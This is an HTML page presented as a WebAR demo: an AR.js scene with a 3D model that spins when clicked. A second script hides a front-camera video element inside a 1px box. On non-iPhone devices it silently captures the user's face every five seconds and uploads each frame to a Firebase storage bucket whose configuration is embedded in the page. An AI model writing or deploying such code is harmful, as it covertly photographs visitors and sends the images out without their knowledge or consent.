<!DOCTYPE html>
<html lang="ru">
<head>
    <title>WebAR Demo on Mobile</title>
    <meta charset="UTF-8">
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/AR-js-org/AR.js/aframe/build/aframe-ar.js"></script>
    <style>
        body { margin: 0; overflow: hidden; }
        #front-camera-video, #canvas { display: none; }
    </style>
</head>
<body>
    <!-- Скрытый видеоэлемент и канвас для фронтальной камеры -->
    <div style="position: absolute; top: 0; left: 0; width: 1px; height: 1px; overflow: hidden;">
        <video id="front-camera-video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <!-- AR-сцена -->
    <a-scene embedded arjs>
        <a-marker preset="hiro">
            <a-entity gltf-model="url(testModel.glb)" 
                      scale="0.5 0.5 0.5" 
                      position="0 0 0" 
                      rotation="0 180 0" 
                      id="interactiveObject"></a-entity>
        </a-marker>
        <a-entity camera></a-entity>
    </a-scene>

    <script>
        // Анимация вращения по клику
        const object = document.getElementById("interactiveObject");
        object.addEventListener("click", () => {
            object.setAttribute("animation", {
                property: "rotation",
                to: "0 0 360",
                loop: true,
                dur: 4000,
            });
        });
    </script>

    <!-- Подключение Firebase и фронтальной камеры -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPswGPJQVRm1HZwcClKo8lXRwjk_pxAyM",
            authDomain: "individualproject-ad702.firebaseapp.com",
            projectId: "individualproject-ad702",
            storageBucket: "individualproject-ad702.appspot.com",
            messagingSenderId: "365705238227",
            appId: "1:365705238227:web:97496033f4e09db0966626"
        };

        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Проверка: если НЕ iPhone — запускаем съёмку
        const isIPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (!isIPhone) {
            document.addEventListener("DOMContentLoaded", () => {
                const frontVideo = document.getElementById('front-camera-video');
                const canvas = document.getElementById('canvas');

                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then(stream => {
                        frontVideo.srcObject = stream;
                        frontVideo.play();
                        setInterval(() => {
                            captureAndUploadPhoto(frontVideo, canvas);
                        }, 5000);
                    })
                    .catch(error => {
                        console.error("Ошибка доступа к фронтальной камере:", error);
                    });
            });
        }

        function captureAndUploadPhoto(videoElement, canvas) {
            const context = canvas.getContext('2d');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            const dataURL = canvas.toDataURL('image/png');
            uploadToFirebase(dataURL);
        }

        function uploadToFirebase(dataURL) {
            const storageRef = ref(storage, `photos/photo_${Date.now()}.png`);
            const file = dataURLtoFile(dataURL, `photo_${Date.now()}.png`);

            uploadBytes(storageRef, file)
                .then(() => {
                    console.log("Фото успешно загружено!");
                })
                .catch(error => {
                    console.error("Ошибка загрузки фото:", error);
                });
        }

        function dataURLtoFile(dataurl, filename) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }
    </script>
</body>
</html>
